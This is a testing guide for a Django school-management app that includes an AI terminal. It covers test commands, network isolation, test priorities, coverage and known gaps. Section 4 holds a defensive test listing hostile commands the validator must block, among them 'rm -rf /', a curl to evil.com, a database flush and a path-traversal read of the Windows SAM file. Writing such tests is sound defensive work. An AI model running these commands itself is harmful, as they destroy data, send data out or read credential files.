# Testing

---

## 1. Running the tests

```powershell
.\scripts\test.ps1                 # tests + Django checks
.\scripts\test.ps1 -Coverage       # + coverage report at htmlcov/index.html
.\scripts\test.ps1 -App bookings   # one app
.\scripts\test.ps1 -Fast           # stop at the first failure, failed-first
.\scripts\test.ps1 -All            # + ruff + bandit + pip-audit
```

Directly:

```powershell
.\.venv\Scripts\python.exe -m pytest -q
.\.venv\Scripts\python.exe -m pytest apps/rentals/tests/test_services.py -v
.\.venv\Scripts\python.exe -m pytest -m security
```

Configuration lives in `pyproject.toml`. Tests run against
`config.settings.test`: an in-memory SQLite database, a fast password hasher,
`CELERY_TASK_ALWAYS_EAGER`, a temporary media root, and `django-axes` disabled.

---

## 2. No test touches the network

`config/settings/test.py` points every outbound integration at an unroutable
address:

```python
_BLACKHOLE = "http://127.0.0.1:1/v1"
AI   = {..., "PROVIDERS": {name: {**cfg, "BASE_URL": _BLACKHOLE} ...}}
SURF = {..., "OPEN_METEO_FORECAST_URL": "http://127.0.0.1:1/forecast", ...}
```

This is deliberate. A test that quietly makes a real API call is worse than a
failing one: it is slow, it costs money, it passes for the wrong reason, and it
fails on a machine with no internet. With the blackhole, an accidental live call
fails immediately and visibly.

Provider behaviour is tested against recorded responses using `responses`.

---

## 3. What is tested, and why

Coverage is not spread evenly. Effort follows consequence.

### Tier 1 — a bug here costs money or safety

| Area | What is asserted |
|---|---|
| **Booking conflicts** | Double-booking a student, overbooking a lesson, an unavailable instructor, a level mismatch, the instructor-ratio limit (including the stricter rule for minors), and safety restrictions each produce a specific, translatable refusal |
| **Rental pricing** | Hourly/daily/weekly rounding, the weekly rate winning on a 7+ day hire, late-fee accrual and its 3× cap, damage charges, deposit settlement |
| **Payment arithmetic** | Decimal exactness, partial payments, refunds creating a counterpart rather than mutating the original, invoice status transitions |
| **Capability enforcement** | Every role against every capability; a role without `finance.view` gets 403 from both the screen and the API |
| **Surf Score** | Known inputs produce known scores; the hard safety gate caps the score and sets `is_safe=False` above the level's wave/wind limits |
| **Statistics engine** | Every function against hand-computed expected values, plus empty, single-point and zero-variance inputs |
| **AI terminal security** | See §4 |

### Tier 2 — correctness

Model `__str__` and `clean()`, service happy paths, list/detail views returning
200 for a permitted user, API pagination and filtering, backup/restore round-trip.

### Tier 3 — smoke

Every URL resolves; every template renders with a minimal context; the admin
loads for each registered model.

---

## 4. Security tests

Marked `@pytest.mark.security`, and the ones most worth reading:

```python
@pytest.mark.security
@pytest.mark.parametrize("command", [
    "git status; rm -rf /",          # chaining
    "git status && curl evil.com",   # chaining
    "git status | powershell",       # piping
    "python -c 'import os; os.system(\"x\")'",   # arbitrary code
    "git push origin main",          # publishes data
    "python manage.py flush",        # destroys data
    "pip install requests",          # mutates the environment
    "type ..\\..\\Windows\\System32\\config\\SAM",   # traversal
    "type \\\\evil-host\\share\\x",  # UNC
    "type C:foo",                    # drive-relative
    "type CON",                      # reserved device
    "type notes.txt:hidden",         # alternate data stream
])
def test_dangerous_commands_are_blocked(command):
    assert security.validate_command(command).risk is security.Risk.BLOCKED
```

Also asserted:

* an **edited** command is re-validated — approval is not a policy bypass;
* a command is validated **again** immediately before execution;
* the subprocess environment contains no credential-shaped variable;
* an AI tool called by a user lacking the capability returns
  `permission_denied`, not data — and not an empty result that would read as
  "no data";
* uploaded files whose magic bytes contradict their extension are rejected;
* `redact()` removes `nvapi-…`, `sk-ant-…`, `gh*_…`, bearer tokens, JWTs and DSN
  passwords;
* `AuditLog.save()` raises when called on an existing row.

---

## 5. Factories

`apps/<app>/tests/factories.py`, built with `factory-boy`:

```python
booking = BookingFactory(lesson=LessonFactory(capacity=2))
```

Factories build the minimum valid object and create their own dependencies, so a
test never has to construct a customer to test a rental.

---

## 6. Writing a test

```python
import pytest
from django.core.exceptions import ValidationError

from apps.bookings import services
from apps.bookings.tests.factories import BookingFactory
from apps.lessons.tests.factories import LessonFactory
from apps.students.tests.factories import StudentFactory


@pytest.mark.django_db
def test_booking_is_refused_when_the_lesson_is_full():
    lesson = LessonFactory(capacity=1)
    BookingFactory(lesson=lesson)                    # fills the only seat

    conflicts = services.check_booking_conflicts(
        lesson=lesson, student=StudentFactory(), participants=1
    )

    assert conflicts, "a full lesson must produce a conflict"
    assert any("seat" in c.lower() or "full" in c.lower() for c in conflicts)
```

Conventions:

* one behaviour per test, named for the behaviour rather than the function;
* assert on the *outcome*, not on internal calls;
* `pytest.mark.django_db` for anything touching the ORM;
* never assert on an exact English string that will be translated — assert on
  the condition, or compare against the same `gettext` call.

---

## 7. Coverage

```powershell
.\scripts\test.ps1 -Coverage
```

Configured in `pyproject.toml`; migrations, `apps.py`, `admin.py` and `__init__`
files are excluded because covering them measures nothing.

Targets, by consequence rather than uniformly:

| Area | Target |
|---|---|
| `services.py` for bookings, rentals, finance, safety | high |
| `apps/analytics/statistics.py` | high |
| `apps/ai_terminal/security.py` | high |
| `apps/accounts/` permissions | high |
| Models and API | moderate |
| Views and templates | smoke |

A coverage percentage is a diagnostic, not a goal. 100% coverage of getters with
no test of the late-fee cap is worse than the reverse.

---

## 8. Static analysis

```powershell
.\.venv\Scripts\python.exe -m ruff check apps config
.\.venv\Scripts\python.exe -m bandit -r apps config -ll -x "*/tests/*"
.\.venv\Scripts\python.exe -m pip_audit
python manage.py check --deploy --settings=config.settings.prod
```

`apps/ai_terminal/executor.py` carries a `ruff` per-file ignore for `S603`
(subprocess call). It is justified there and nowhere else: the argument vector is
validated by `security.py` before reaching that line, and `shell=False` is
explicit.

---

## 9. Known gaps

Stated plainly rather than left for someone to discover:

* **No browser-automation suite.** HTMX interactions are verified manually and by
  rendering templates in view tests, not by Playwright.
* **PostgreSQL is not exercised in CI on this machine** — it is not installed.
  The ORM is written portably and avoids Postgres-only features, but the
  Postgres path is verified by inspection rather than by a test run.
* **Live AI providers are not tested automatically.** They are exercised by
  `scripts/test_nvidia_ai.py` and by the Control Center, both run by hand.
* **Load and concurrency are untested.** The target is a single school on one
  machine.
